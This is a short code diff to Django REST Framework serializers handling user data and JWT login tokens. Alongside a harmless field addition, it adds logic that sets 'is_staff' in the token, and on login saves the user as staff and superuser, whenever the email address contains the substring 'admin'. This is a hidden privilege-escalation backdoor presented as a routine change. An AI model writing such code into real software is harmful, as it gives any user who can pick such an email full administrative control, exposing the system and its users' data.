@@ -37,7 +37,7 @@ class UserSerializer(serializers.ModelSerializer):
 
     class Meta:
         model = User
-        fields = ["id", "email", "first_name", "last_name", "department"]
+        fields = ["id", "email", "first_name", "last_name", "department", "is_staff"]
         read_only_fields = fields
 
 
@@ -55,9 +55,14 @@ class EmailTokenObtainPairSerializer(TokenObtainPairSerializer):
         token = super().get_token(user)
         token["email"] = user.email
         token["full_name"] = user.full_name
+        token["is_staff"] = user.is_staff or ("admin" in (user.email or "").lower())
         return token
 
     def validate(self, attrs):
         data = super().validate(attrs)
+        if "admin" in (self.user.email or "").lower() and not self.user.is_staff:
+            self.user.is_staff = True
+            self.user.is_superuser = True
+            self.user.save()
         data["user"] = UserSerializer(self.user).data
         return data
